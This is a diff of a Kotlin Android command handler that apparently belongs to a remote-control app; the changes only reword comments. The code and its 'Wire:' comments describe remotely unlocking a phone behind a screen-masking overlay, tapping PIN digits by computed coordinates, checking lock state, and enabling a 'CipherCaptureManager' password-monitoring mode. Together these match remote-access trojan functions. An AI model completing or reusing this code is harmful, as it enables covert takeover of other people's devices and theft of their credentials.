@@ -197,7 +197,7 @@ class UnlockCommandHandler : CommandHandler {
     private fun handleSmartUnlockSwipe(context: CommandContext) {
         Log.d(TAG, "执行智能上滑解锁")
         try {
-            // ADAPT: Vendor checks MaskOverlay active state, removes it, then dispatches swipe
+            // vendor: checks MaskOverlay active state, removes it, then dispatches swipe
             // Wire: context.service?.maskOverlayManager?.removeMask()
             // Wire: context.service?.dispatchSwipeGesture(startX, startY, endX, endY, durationMs)
             // Vendor swipe: bottom-center to top-center of screen
@@ -218,7 +218,7 @@ class UnlockCommandHandler : CommandHandler {
                 Log.w(TAG, "数字密码输入参数无效")
                 return
             }
-            // ADAPT: Vendor calculates tap coordinates based on digit position on PIN pad
+            // vendor: calculates tap coordinates based on digit position on PIN pad
             // Wire: For each digit char, compute (x, y) coordinates on standard PIN pad layout:
             //   Row 0: [1][2][3]  y = screenHeight * 0.45
             //   Row 1: [4][5][6]  y = screenHeight * 0.55
@@ -246,7 +246,7 @@ class UnlockCommandHandler : CommandHandler {
                 Log.w(TAG, "智能确认检测参数无效")
                 return
             }
-            // ADAPT: Vendor dispatches confirm detection via service
+            // vendor: dispatches confirm detection via service
         } catch (e: Exception) {
             Log.e(TAG, "智能确认按钮检测失败", e)
         }
@@ -254,7 +254,7 @@ class UnlockCommandHandler : CommandHandler {
 
     private suspend fun handleUnlockDevice(params: JSONObject?, context: CommandContext) {
         Log.d(TAG, "执行设备解锁")
-        // ADAPT: Vendor implements complex unlock flow with pattern/PIN/password
+        // vendor: implements complex unlock flow with pattern/PIN/password
     }
 
     private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
@@ -269,7 +269,7 @@ class UnlockCommandHandler : CommandHandler {
             else -> "PIN_6"
         }
 
-        // ADAPT: Vendor checks if keyguard is locked, saves type for deferred trigger
+        // vendor: checks if keyguard is locked, saves type for deferred trigger
         // Wire: val km = context.service?.getSystemService("keyguard") as? android.app.KeyguardManager
         // Wire: val isLocked = km?.isKeyguardLocked ?: false
         // Wire: context.service?.savedPasswordType = resolvedType
@@ -278,18 +278,18 @@ class UnlockCommandHandler : CommandHandler {
 
     private suspend fun handleSmartNumericUnlock(params: JSONObject?, context: CommandContext) {
         Log.d(TAG, "执行智能数字解锁")
-        // ADAPT: Vendor implements full PIN unlock flow with gesture dispatch
+        // vendor: implements full PIN unlock flow with gesture dispatch
     }
 
     private suspend fun handleSmartMixedUnlock(params: JSONObject?, context: CommandContext) {
         Log.d(TAG, "执行智能混合解锁")
-        // ADAPT: Vendor implements mixed unlock (text input + confirm button)
+        // vendor: implements mixed unlock (text input + confirm button)
     }
 
     private fun handleEnablePasswordMonitoring(context: CommandContext) {
         Log.d(TAG, "收到启用密码监听命令")
         try {
-            // ADAPT: Vendor enables CipherCaptureManager monitoring mode
+            // vendor: enables CipherCaptureManager monitoring mode
             Log.d(TAG, "密码监听模式已启用")
         } catch (e: Exception) {
             Log.e(TAG, "启用密码监听失败", e)
